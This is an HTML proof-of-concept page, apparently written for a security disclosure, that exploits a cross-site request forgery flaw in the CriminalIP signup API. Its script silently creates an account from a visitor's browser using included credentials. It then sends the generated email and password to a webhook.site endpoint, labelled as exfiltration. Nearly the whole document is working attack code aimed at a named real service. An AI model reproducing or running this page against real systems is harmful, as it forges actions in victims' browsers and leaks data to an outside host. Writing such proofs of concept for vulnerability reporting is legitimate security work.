<!DOCTYPE html>
<html>
<head>
  <title>CriminalIP CSRF PoC</title>
</head>
<body>
  <h1>CSRF Exploit - CriminalIP Account Creation with Exfiltration</h1>
  <script>
    const victimEmail = "csrfvictim" + Math.floor(Math.random() * 100000) + "@evil.com";
    const password = "Attacker@123";

    // Step 1: Trigger vulnerable CSRF request
    fetch("https://www.criminalip.io/api/auth/user/signup", {
      method: "POST",
      credentials: "include",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        account_type: "not_social",
        email: victimEmail,
        uid: "",
        name: "CSRF Victim",
        pw: password,
        pp_agree_code: "1",
        tos_agree_code: "1",
        ad_agree_code: "1"
      })
    });

    // Step 2: Exfiltrate email + password to webhook.site
    fetch("https://webhook.site/61001786-599b-402b-bcc7-4fbd4fc63a88", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        email: victimEmail,
        password: password,
        note: "CSRF triggered in victim browser"
      })
    });
  </script>
</body>
</html>
